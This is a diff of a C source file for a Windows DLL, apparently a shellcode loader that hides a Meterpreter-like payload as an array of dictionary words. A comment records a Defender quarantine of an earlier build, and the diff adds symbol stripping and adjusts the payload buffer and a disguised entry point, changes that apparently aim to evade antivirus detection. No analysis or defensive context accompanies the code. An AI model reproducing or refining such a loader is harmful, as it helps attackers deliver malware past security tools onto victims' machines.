@@ -9,7 +9,7 @@
     Defender - Trojan:Win32/Meterpreter.O - Quarantined
 
     To build: 
-    x86_64-w64-mingw32-gcc -shared -o win64_cmd_exec.dll win64_cmd_exec.c -fpermissive -Wl,-eImageNtHeader
+    x86_64-w64-mingw32-gcc -shared -o win64_cmd_exec.dll win64_cmd_exec.c -s -fpermissive -Wl,-eImageNtHeader
 */
 #include <windows.h>
 
@@ -26,7 +26,7 @@ const char* dict_words[282] = { "empire","legally","oxford","census","convert","
 "legally","oxford","audio","relation","sweet","feels","class","ferry","samsung","presence","create","choices","magic","glasses","absent","charms","chester","theme","managers","discrete","samoa","dynamic","heavy","feeds","nervous","prompt","oriental","theme","tender","findings",
 "chester","offers","isaac","findings","soldier","soldier","commands","findings","favorite","findings","discrete" };
 
-unsigned char payload[sizeof(dict_words)] = {0}; //placeholder
+unsigned char payload[sizeof(dict_words)]; //placeholder
 
 BOOL WINAPI ImageNtHeader(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
   switch (fdwReason) {
